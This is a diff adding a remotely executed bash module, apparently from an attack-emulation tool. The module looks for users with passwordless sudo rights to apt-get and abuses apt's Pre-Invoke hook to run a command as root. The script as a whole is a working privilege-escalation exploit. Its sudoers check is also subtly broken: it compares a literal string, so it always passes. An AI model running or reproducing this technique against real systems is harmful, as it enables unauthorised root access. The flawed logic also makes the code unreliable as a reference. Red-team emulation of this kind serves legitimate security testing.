@@ -1,0 +1,38 @@
+execute: remote
+script: |
+  #!/bin/bash
+
+  function getParam() {
+   if [ "$1" != "null" ]; then
+       echo $1 | cut -d\" -f 2
+   else
+       echo ""
+   fi
+  }
+
+  principal=$(getParam $1)
+  host=$(getParam $2)
+  username=$(getParam $3)
+  knowledge=$4
+
+  knowledge=$(echo ${knowledge//[\[\]\"]} | tr ',' ' ')
+
+  ret=""
+  for k in $knowledge
+  do
+   #out=$(grep $k /etc/sudoers | grep NOPASSWD | grep apt)
+   #if [ "$out" != "" ]; then
+   if [ "out=$(grep $k /etc/sudoers | grep NOPASSWD | grep apt)" != "" ]; then
+       #if ret=$(timeout 3s 2>&1 su $k -c 'sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::="id"' | grep $username); then
+       ret=$(timeout 3s 2>&1 su $k -c 'sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::="id"' | grep $username) && break
+       #break
+       #fi
+   fi
+  done
+
+  #if [ "$ret" == "" ]; then
+  #    username=""
+  #fi
+  [ "$ret" != "" ] || username=""
+
+  echo -n "{\"principal\":\"$principal\", \"username\":\"$username\", \"host\":\"$host\""}
